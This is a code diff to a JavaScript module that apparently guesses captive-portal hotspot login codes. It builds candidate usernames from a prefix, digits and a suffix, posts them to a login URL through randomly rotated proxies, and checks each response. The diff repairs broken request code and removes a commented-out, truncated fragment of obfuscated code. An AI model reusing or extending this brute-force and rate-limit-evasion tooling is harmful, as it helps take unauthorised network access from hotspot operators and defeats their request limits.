@@ -1,5 +1,6 @@
-//fc6de=a0_0x31a8,_0x3b7875=_0x394090();while(!![]){try{consmt _0x2314b2=parseInt(_0x4fc6de(0x127))/0x1+-parseInt(_0x4fc6de(0x121))/0x2*(-pars
-import tpsProxyAgent from 'https-proxy-agent';
+
+import {proxies} from "./proxies.js";
+import { HttpsProxyAgent } from 'https-proxy-agent';
 import axios from "axios";
 import { loadConfig } from "./config.js"
 import { url, logout_url, method,headers,randomPartLength,digits,prefix,suffix } from "./variables.js";
@@ -13,13 +14,6 @@ export async function checkServerConnection() {
         return false;
     }
 }
-const proxies = [
-  'http://192.168.1.100:8080',
-  'http://192.168.1.101:8080',
-  'http://192.168.1.102:8080'
-  // أضف المزيد
-];
-
 export function Wait() {
 
     console.log(chalk.green(`[+] wait for connect please check from Network `));
@@ -60,28 +54,38 @@ export async function Logout(username) {
         console.log(chalk.red(`[!] Logout failed: ${err.message}`));
     }
 }
-let t = 3300;
-export
-    async function sendRequest(username) {
+export async function sendRequest(username) {
     const data = new URLSearchParams({
         username,
         domain: '1M%2F4M',
         popup: true,
-
         var: 'callBack',
-        verfiy: false, timeout: 500
+        verfiy: false
     });
-const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-  const agent = new HttpsProxyAgent(proxy);
+
+    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+    const agent = new HttpsProxyAgent(proxy);
+
     if (method === "POST") {
-        return await axios.post(url,httpsAgent:agent ,data, headers);
+        return await axios.post(url, data, {
+            headers: headers,
+            httpsAgent: agent
+        });
     } else if (method === "GET") {
-        config.params = { username, verify: 'callBack' };
-        return await axios.get(url, headers);
+        const config = {
+            params: {
+                username: username,
+                verify: 'callBack'
+            },
+            headers: headers,
+            httpsAgent: agent
+        };
+        return await axios.get(url, config);
     } else {
         throw new Error(`Unsupported method: ${method}`);
     }
 }
+
 export function checkfromResponse(response) {
     try {
         if (typeof response.data === 'string') {
